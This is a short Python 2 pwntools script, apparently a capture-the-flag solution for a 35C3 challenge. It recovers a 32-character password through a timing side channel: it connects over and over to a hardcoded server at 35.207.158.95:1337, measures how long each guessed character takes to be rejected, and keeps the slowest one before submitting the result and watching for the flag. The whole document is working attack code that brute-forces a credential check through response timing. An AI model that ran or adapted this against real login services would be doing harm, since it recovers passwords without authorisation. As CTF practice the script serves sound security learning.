from pwn import *

# 10e004c2e186b4d280fad7f36e779ed4

chars = list("1234567890qwertyuiopasdfghjklzxcvbnm")
password = list(" "*32)
possible_flag = None

for p in range(len(password)):
   print "[*] Char {}.".format(p)

   if password[p] != " ":
      print "[*] Already set, going on..."
      continue

   best_char = " "
   best_response_time = 0.0

   for c in range(len(chars)):
      password[p] = chars[c]
      password_string = "".join(password)
      print "[*] Testing password '{}'.".format(password_string)
      r = remote("35.207.158.95", 1337)
      print r.recvline()
      r.sendline(password_string)
      start = time.time()
      received_response = r.recvall()
      end = time.time()
      print received_response
      r.close()

      if received_response is not None and "35c3" in received_response.lower():
         possible_flag = received_response

      response_time = end - start
      print "[*] Response time is '{}'.".format(response_time)
      if response_time > best_response_time:
         best_response_time = response_time
         best_char = chars[c]

   password[p] = best_char

password_string = "".join(password)
print "    ===================================================="
print "[*] The password is '{}'.".format(password_string)
print "    ===================================================="

if possible_flag is not None:
   print "[*] A possible flag is '{}'.".format(possible_flag)
   print "    ===================================================="

print "[*] Testing password '{}'.".format(password_string)
r = remote("35.207.158.95", 1337)
print r.recvline()
r.sendline(password_string)
print r.recvall()